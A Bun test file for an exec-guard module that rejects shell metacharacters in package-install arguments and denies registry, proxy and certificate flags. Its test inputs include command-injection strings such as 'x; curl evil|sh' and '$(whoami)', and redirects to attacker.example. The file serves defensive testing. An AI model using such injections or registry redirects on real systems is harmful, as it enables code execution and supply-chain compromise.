import { describe, expect, test } from "bun:test";
import { deniedFlag, validateArgv } from "@/tools/exec-guard";

describe("validateArgv", () => {
  test("accepts a plain install argv", () => {
    expect(validateArgv(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });

  test("rejects shell metacharacters", () => {
    for (const bad of ["x; curl evil|sh", "$(whoami)", "a && b", "`id`", "a > out", "a\nb"]) {
      expect(validateArgv(["bun", "add", bad])).toBeDefined();
    }
  });

  test("rejects a leading tilde", () => {
    expect(validateArgv(["bun", "add", "~/x"])).toBeDefined();
  });

  test("rejects a binary containing a path separator", () => {
    expect(validateArgv(["./evil", "run"])).toBeDefined();
  });

  test("rejects an empty argv and non-string elements", () => {
    expect(validateArgv([])).toBeDefined();
    expect(validateArgv(["bun", 3])).toBeDefined();
    expect(validateArgv("bun add")).toBeDefined();
  });

  test("rejects quotes and a backslash", () => {
    for (const bad of ["a'b", 'a"b', "a\\b"]) {
      expect(validateArgv(["bun", "add", bad])).toBeDefined();
    }
  });

  test("allows a python extras specifier with brackets", () => {
    // Regression guard: METACHARACTERS deliberately excludes `[` and `]` so
    // this legitimate pip/uv extras syntax is not mistaken for shell glob
    // syntax. See the ruling comment beside METACHARACTERS.
    expect(validateArgv(["uv", "add", "httpx[http2]"])).toBeUndefined();
  });
});

describe("deniedFlag", () => {
  test("catches a registry redirect that a prefix grant would admit", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry", "https://attacker.example"])).toBe("--registry");
  });

  test("catches --index-url, -g and --prefix", () => {
    expect(deniedFlag(["pip", "install", "x", "--index-url", "http://x"])).toBe("--index-url");
    expect(deniedFlag(["npm", "install", "-g", "x"])).toBe("-g");
    expect(deniedFlag(["npm", "install", "--prefix", "/tmp"])).toBe("--prefix");
  });

  test("catches --flag=value form", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry=https://attacker.example"])).toBe("--registry");
  });

  test("allows an ordinary install", () => {
    expect(deniedFlag(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });

  test("normalizes flag casing before the denylist lookup", () => {
    expect(deniedFlag(["bun", "add", "x", "--REGISTRY", "https://attacker.example"])).toBe("--registry");
    expect(deniedFlag(["bun", "add", "x", "--Registry=https://attacker.example"])).toBe("--registry");
  });

  test("catches --extra-index-url", () => {
    expect(deniedFlag(["pip", "install", "x", "--extra-index-url", "http://attacker.example"])).toBe(
      "--extra-index-url",
    );
  });

  test("catches the pip trust-boundary flags --trusted-host and --cert", () => {
    expect(deniedFlag(["pip", "install", "x", "--trusted-host", "attacker.example"])).toBe("--trusted-host");
    expect(deniedFlag(["pip", "install", "x", "--cert", "/tmp/ca.pem"])).toBe("--cert");
  });

  test("catches the npm-family trust-boundary flags --strict-ssl, --cafile and --ca", () => {
    expect(deniedFlag(["npm", "install", "x", "--strict-ssl", "false"])).toBe("--strict-ssl");
    expect(deniedFlag(["npm", "install", "x", "--cafile", "/tmp/ca.pem"])).toBe("--cafile");
    expect(deniedFlag(["npm", "install", "x", "--ca", "-----BEGIN CERTIFICATE-----"])).toBe("--ca");
  });

  test("catches the transport-redirecting flags --proxy, --https-proxy and --noproxy", () => {
    expect(deniedFlag(["npm", "install", "x", "--proxy", "http://attacker.example"])).toBe("--proxy");
    expect(deniedFlag(["npm", "install", "x", "--https-proxy", "http://attacker.example"])).toBe("--https-proxy");
    expect(deniedFlag(["npm", "install", "x", "--noproxy", "registry.npmjs.org"])).toBe("--noproxy");
  });
});
